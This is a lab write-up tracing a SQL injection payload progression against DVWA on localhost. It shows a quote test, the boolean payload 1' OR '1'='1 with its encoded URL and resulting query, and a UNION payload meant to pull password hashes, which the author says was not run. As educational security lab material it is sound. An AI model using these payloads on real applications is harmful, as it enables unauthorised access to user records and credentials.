# F-01 — SQL Injection | Payload Progression

## Target
- Application: DVWA (Damn Vulnerable Web Application)
- Module: SQL Injection
- Security Level: Low
- URL: `http://localhost:8080/vulnerabilities/sqli/`

---

## Step 1 — Baseline (Normal Input)

**What I tried first:**
```
1
```

**What happened:**
The application returned a single row as expected.
```
ID: 1
First name: admin
Surname: admin
```

This confirmed the input field is connected to a live database query.
At this point it looked like a normal search — nothing suspicious yet.

---

## Step 2 — Testing for Injection (Single Quote Test)

**What I tried:**
```
1'
```

**What happened:**
The page returned a database error or a blank result.
This was the first signal — a single quote broke the query syntax,
which means the input is going directly into SQL without escaping.

**Why this matters:**
A properly coded application would either sanitise the quote or use
parameterised queries, making the quote harmless. The error here told
me the raw input is landing inside a SQL string, unprotected.

---

## Step 3 — Confirming Injection with Boolean Payload

**What I tried:**
```
1' OR '1'='1
```

**Full URL:**
```
http://localhost:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
```

**What happened:**
The application dumped ALL user records from the database — five rows
instead of one. This confirmed the injection is fully working.

**Why this payload works:**
The server builds this query:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
The condition `'1'='1'` is always true, so the WHERE clause matches
every row in the table. The database returns everything.

---

## Step 4 — Why Earlier Attempts Without the Quote Failed

When I typed just `1 OR 1=1` (without the quote), nothing unusual
happened. The reason: the query template wraps user input in single
quotes automatically:
```sql
WHERE user_id = '1 OR 1=1'
```
That entire string is treated as a literal value, not logic.
The opening single quote in `1' OR '1'='1` is what *breaks out* of
that string context and lets the injected logic execute.

---

## Final Working Payload

```
1' OR '1'='1
```

- **Effect:** Returns all rows from the users table
- **Injection type:** Boolean-based, in-band SQL Injection
- **OWASP Category:** A03:2021 — Injection
- **DVWA Security Level tested:** Low

---

## What a More Advanced Payload Would Look Like

A real attacker would go further with UNION-based injection to extract
password hashes, for example:
```
1' UNION SELECT user, password FROM users-- -
```
This was not executed in this engagement as the goal was to confirm
exploitability, not to fully compromise the database.
